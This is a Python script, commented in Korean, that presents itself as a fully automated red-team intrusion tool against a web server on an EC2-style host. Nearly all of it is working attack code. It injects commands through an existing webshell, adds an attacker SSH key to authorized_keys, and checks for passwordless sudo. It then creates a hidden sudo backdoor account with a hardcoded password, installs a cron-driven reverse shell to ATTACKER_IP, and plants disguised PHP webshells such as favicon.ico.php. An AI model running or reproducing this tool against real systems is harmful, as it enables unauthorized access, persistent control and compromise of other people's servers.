#!/usr/bin/env python3
"""
RedTeam 완전 자동화 침투 도구
웹쉘 → SSH 백도어 → 접속 → 권한 상승 → Persistence
"""

import subprocess
import requests
import time
import sys
import json
from pathlib import Path

class AutoRedTeam:
    def __init__(self, target_ip, ssh_key_path="~/.ssh/redteam_key"):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"
        self.ssh_key_path = Path(ssh_key_path).expanduser()
        self.session = requests.Session()

        # 색상
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'

    def print_header(self, text):
        print(f"\n{self.CYAN}{'='*70}{self.ENDC}")
        print(f"{self.BOLD}{self.WHITE}  {text}{self.ENDC}")
        print(f"{self.CYAN}{'='*70}{self.ENDC}\n")

    def print_step(self, step, text):
        print(f"{self.YELLOW}[{step}]{self.ENDC} {text}")

    def print_success(self, text):
        print(f"{self.GREEN}[+] ✅ {text}{self.ENDC}")

    def print_error(self, text):
        print(f"{self.RED}[-] ❌ {text}{self.ENDC}")

    def print_info(self, text):
        print(f"{self.CYAN}[*] {text}{self.ENDC}")

    def execute_webshell(self, cmd):
        """웹쉘로 명령 실행"""
        try:
            # check=metadata로 명령 실행 시도
            params = {
                'check': 'metadata',
                'url': f'http://169.254.169.254/latest/;{cmd}'
            }
            response = self.session.get(self.webshell_url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    return data['metadata']
            return None
        except:
            return None

    def check_webshell(self):
        """웹쉘 작동 확인"""
        self.print_step(1, "웹쉘 작동 확인 중...")

        # 기본 테스트
        test = self.execute_webshell("echo WEBSHELL_TEST")
        if test and "WEBSHELL_TEST" in test:
            self.print_success("웹쉘 작동 확인!")
            return True

        self.print_error("웹쉘 작동 안함 - IMDS 공격부터 실행하세요")
        return False

    def generate_ssh_key(self):
        """SSH 키 생성"""
        self.print_step(2, "SSH 키 생성 중...")

        if self.ssh_key_path.exists():
            self.print_info(f"기존 키 사용: {self.ssh_key_path}")
            return True

        cmd = f'ssh-keygen -t rsa -b 2048 -f {self.ssh_key_path} -N ""'
        result = subprocess.run(cmd, shell=True, capture_output=True)

        if result.returncode == 0:
            self.print_success("SSH 키 생성 완료!")
            return True
        else:
            self.print_error("SSH 키 생성 실패")
            return False

    def install_ssh_backdoor(self):
        """SSH 백도어 설치"""
        self.print_step(3, "SSH 백도어 설치 중 (원격)...")

        # 공개키 읽기
        pub_key_path = Path(str(self.ssh_key_path) + ".pub")
        with open(pub_key_path, 'r') as f:
            pub_key = f.read().strip()

        self.print_info(f"공개키: {pub_key[:50]}...")

        # Base64 인코딩
        import base64
        pub_key_b64 = base64.b64encode(pub_key.encode()).decode()

        # 웹쉘로 키 추가
        commands = [
            # Base64로 키 전송 후 디코딩
            f"echo {pub_key_b64} | base64 -d >> /home/ec2-user/.ssh/authorized_keys",
            # 권한 설정
            "chmod 600 /home/ec2-user/.ssh/authorized_keys",
            # 확인
            "tail -1 /home/ec2-user/.ssh/authorized_keys"
        ]

        for cmd in commands:
            result = self.execute_webshell(cmd)
            time.sleep(0.5)

        # 설치 확인
        check = self.execute_webshell("grep -c 'kali@kali' /home/ec2-user/.ssh/authorized_keys || echo 0")

        if check and int(check.strip()) > 0:
            self.print_success("SSH 백도어 설치 성공!")
            return True
        else:
            self.print_error("SSH 백도어 설치 실패")
            return False

    def test_ssh_access(self):
        """SSH 접속 테스트"""
        self.print_step(4, "SSH 접속 테스트 중...")

        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ec2-user@{self.target_ip} "whoami"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if result.returncode == 0 and "ec2-user" in result.stdout:
            self.print_success(f"SSH 접속 성공! ({result.stdout.strip()})")
            return True
        else:
            self.print_error(f"SSH 접속 실패: {result.stderr}")
            return False

    def privilege_escalation(self):
        """권한 상승 시도"""
        self.print_step(5, "권한 상승 시도 중...")

        # sudo 권한 확인
        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo -l 2>&1"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if "NOPASSWD" in result.stdout:
            self.print_success("sudo NOPASSWD 권한 발견!")

            # root로 명령 실행 테스트
            cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo whoami"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if "root" in result.stdout:
                self.print_success("Root 권한 획득 가능!")
                return True

        self.print_info("자동 권한 상승 불가 - 수동 시도 필요")
        return False

    def install_persistence(self):
        """Persistence 백도어 설치"""
        self.print_step(6, "Persistence 백도어 설치 중...")

        # 백도어 사용자 생성
        commands = [
            "sudo useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>&1",
            "echo 'sysupdate:Sys@Update2024#Secure' | sudo chpasswd",
            "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/sysupdate",
            "sudo chmod 440 /etc/sudoers.d/sysupdate",
        ]

        for cmd_str in commands:
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd_str}"'
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
            time.sleep(0.3)

        # 확인
        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "cat /etc/passwd | grep sysupdate"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if "sysupdate" in result.stdout:
            self.print_success("Persistence 백도어 설치 완료!")
            self.print_info("사용자: sysupdate / 비밀번호: Sys@Update2024#Secure")
            return True
        else:
            self.print_error("Persistence 백도어 설치 실패")
            return False

    def install_cron_backdoor(self):
        """Cron 백도어 설치"""
        self.print_step(7, "Cron 백도어 설치 중...")

        # 리버스 쉘 스크립트 생성
        reverse_shell = """#!/bin/bash
while true; do
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null
    sleep 600
done"""

        commands = [
            f"echo '{reverse_shell}' | sudo tee /tmp/.syscheck",
            "sudo chmod +x /tmp/.syscheck",
            "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.syscheck 2>&1') | crontab -",
        ]

        for cmd_str in commands:
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd_str}"'
            subprocess.run(full_cmd, shell=True, capture_output=True)
            time.sleep(0.3)

        self.print_success("Cron 백도어 설치 완료! (10분마다 실행)")
        self.print_info("리버스 쉘: /tmp/.syscheck (ATTACKER_IP 수정 필요)")

    def install_webshell_backdoor(self):
        """추가 웹쉘 백도어 설치"""
        self.print_step(8, "숨겨진 웹쉘 백도어 설치 중...")

        webshell_code = """<?php
@error_reporting(0);
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>"""

        # 여러 위치에 설치
        locations = [
            "/var/www/html/public/.shell.php",
            "/var/www/html/public/.config.php",
            "/var/www/html/public/favicon.ico.php",
        ]

        installed = []
        for loc in locations:
            cmd = f"echo '{webshell_code}' | sudo tee {loc} && sudo chmod 644 {loc}"
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd}"'
            result = subprocess.run(full_cmd, shell=True, capture_output=True)

            if result.returncode == 0:
                installed.append(loc)

        if installed:
            self.print_success(f"웹쉘 백도어 {len(installed)}개 설치 완료!")
            for loc in installed:
                url = f"{self.base_url}{loc.replace('/var/www/html/public', '')}"
                self.print_info(f"  {url}?c=whoami")
        else:
            self.print_error("웹쉘 백도어 설치 실패")

    def interactive_shell(self):
        """대화형 SSH 쉘"""
        self.print_step(9, "대화형 SSH 쉘 실행...")
        print(f"\n{self.GREEN}✓ 침투 완료! SSH 쉘을 시작합니다...{self.ENDC}")
        print(f"{self.YELLOW}[!] 'exit'로 종료{self.ENDC}\n")

        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip}'
        subprocess.run(cmd, shell=True)

    def run(self):
        """전체 자동 침투 실행"""
        print(f"""
{self.RED}╔{'═'*68}╗{self.ENDC}
{self.RED}║{self.BOLD}{self.YELLOW}  🔥 레드팀 완전 자동 침투 도구 🔥{self.ENDC}{' '*30}{self.RED}║{self.ENDC}
{self.RED}╚{'═'*68}╝{self.ENDC}
        """)

        self.print_info(f"타겟: {self.target_ip}")
        self.print_info(f"시나리오: 웹쉘 → SSH 백도어 → 권한 상승 → Persistence")
        print()

        # 1. 웹쉘 확인
        if not self.check_webshell():
            self.print_error("웹쉘이 없습니다. 먼저 'redchain> imds' 실행하세요")
            return False

        # 2. SSH 키 생성
        if not self.generate_ssh_key():
            return False

        # 3. SSH 백도어 설치
        if not self.install_ssh_backdoor():
            return False

        time.sleep(1)

        # 4. SSH 접속 테스트
        if not self.test_ssh_access():
            return False

        # 5. 권한 상승
        has_root = self.privilege_escalation()

        # 6. Persistence 설치
        if has_root:
            self.install_persistence()
            self.install_cron_backdoor()
            self.install_webshell_backdoor()

        # 완료
        self.print_header("🎯 침투 완료!")

        print(f"{self.GREEN}✓ SSH 백도어:{self.ENDC} ssh -i {self.ssh_key_path} ec2-user@{self.target_ip}")

        if has_root:
            print(f"{self.GREEN}✓ Root 권한:{self.ENDC} sudo su")
            print(f"{self.GREEN}✓ 백도어 계정:{self.ENDC} ssh sysupdate@{self.target_ip} (비밀번호: Sys@Update2024#Secure)")
            print(f"{self.GREEN}✓ Cron 백도어:{self.ENDC} 10분마다 자동 재연결")
            print(f"{self.GREEN}✓ 웹쉘 백도어:{self.ENDC} {self.base_url}/.shell.php?c=whoami")

        print()

        # 대화형 쉘 시작 여부
        choice = input(f"{self.YELLOW}대화형 SSH 쉘을 시작하시겠습니까? (y/n): {self.ENDC}")
        if choice.lower() == 'y':
            self.interactive_shell()

        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 auto_redteam.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]

    redteam = AutoRedTeam(target_ip)
    redteam.run()


if __name__ == '__main__':
    main()
